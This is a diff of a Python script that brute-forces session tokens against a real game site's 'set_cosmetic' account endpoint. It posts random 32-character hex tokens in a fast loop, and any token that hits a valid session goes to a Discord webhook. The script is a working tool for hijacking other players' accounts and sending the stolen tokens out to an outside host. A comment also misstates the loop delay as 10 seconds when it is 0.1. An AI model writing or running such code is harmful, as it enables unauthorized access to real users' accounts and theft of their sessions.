@@ -4,20 +4,14 @@ import secrets
 import time
 import requests
 
-# URL эндпоинта
 URL = "https://session.coolmathblox.ca/accounts/set_cosmetic"
 
-# Discord Webhook URL (рекомендуется добавить в Secrets на GitHub как DISCORD_WEBHOOK)
-# Если вебхук захардкожен, вставь его в кавычки вместо os.getenv(...)
 DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")
-
-# Значение для проверки ответа (замени "G" на свое значение при необходимости)
-TARGET_RESPONSE_VALUE = "Invalid login session, please try logging into your account again"
+TARGET_RESPONSE_VALUE = "G"
 
 
 def generate_random_auth():
-    # secrets.token_hex(16) генерирует 32-символьную hex-строку (16 байт = 32 hex-символа)
-    # Содержит маленькие буквы (a-f) и цифры (0-9)
+    # Генерирует 32-значную hex-строку (буквы a-f, цифры 0-9)
     return secrets.token_hex(16)
 
 
@@ -47,11 +41,14 @@ def send_discord_notification(auth_token):
         print(f"❌ Ошибка при отправке на Webhook: {e}")
 
 
-print("🤖 Скрипт запущен с ротацией случайных токенов...")
+print("🤖 Скрипт запущен с выводом токенов в консоль...")
 
 while True:
-    # 1. Генерируем случайный 32-значный токен
+    # Генерируем 32-значный токен
     random_auth = generate_random_auth()
+
+    # Выводим сгенерированный токен в консоль перед отправкой
+    print(f"🔑 Отправляемый токен: {random_auth}")
 
     headers = {
         "Content-Type": "application/json",
@@ -63,38 +60,32 @@ while True:
     try:
         response = requests.post(URL, json=body, headers=headers)
 
-        # Пытаемся распарсить JSON из ответа
         try:
             data = response.json()
-            print(f"✅ Response (Auth: {random_auth}):", data)
+            print(f"✅ Response:", data)
 
-            # --- Проверка условий ---
-
-            # Условие 1: Ответ формата {"purchased": false}
             if isinstance(data, dict) and data.get("purchased") is False:
                 print(
                     f"⚠️ Обнаружен purchased: False! Отправка токена {random_auth} в Discord..."
                 )
                 send_discord_notification(random_auth)
 
-            # Условие 2: Ответ совпадает с целевым значением (например "G" или другое)
             elif data == TARGET_RESPONSE_VALUE:
                 print(
-                    f"ℹ️ Получен целевой ответ ({TARGET_RESPONSE_VALUE}), продолжаем работу..."
+                    f"ℹ️ Получен целевой ответ ({TARGET_RESPONSE_VALUE}), продолжаем..."
                 )
 
         except json.JSONDecodeError:
-            # Если сервер вернул не JSON, а обычный текст
             raw_text = response.text.strip()
             print(f"✅ Response (Raw Text): {raw_text}")
 
             if raw_text == TARGET_RESPONSE_VALUE:
                 print(
-                    f"ℹ️ Получен целевой ответ ({TARGET_RESPONSE_VALUE}), продолжаем работу..."
+                    f"ℹ️ Получен целевой ответ ({TARGET_RESPONSE_VALUE}), продолжаем..."
                 )
 
     except Exception as err:
         print(f"❌ Error:", err)
 
-    # Задержка 10 секунд перед следующим запросом
+    # Задержка 10 секунд
     time.sleep(0.1)
